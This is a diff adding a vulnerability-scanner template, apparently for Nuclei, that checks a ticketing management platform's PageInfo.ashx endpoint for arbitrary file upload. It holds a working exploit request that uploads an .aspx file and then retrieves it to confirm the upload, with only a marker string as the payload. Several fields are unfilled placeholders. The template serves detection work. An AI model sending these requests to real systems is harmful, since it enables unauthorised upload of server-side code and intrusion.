@@ -1,0 +1,34 @@
+id: zckx-PageInfo-upload
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: 中城科信票务管理平台  PageInfo  接口处存在任意文件上传漏洞,恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /SystemManager/PageInfo.ashx?Method=WxUploadImage&fileName=dudesite.aspx&showNo=dudesite&imageType=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+        whoisceshi
+      - |+
+        GET /HtmlUploadImage/dudesite_1.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Accept: */*
+        Referer: http://zhkt.whvtc.net/zhjx/pages/czy/czydr.html
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
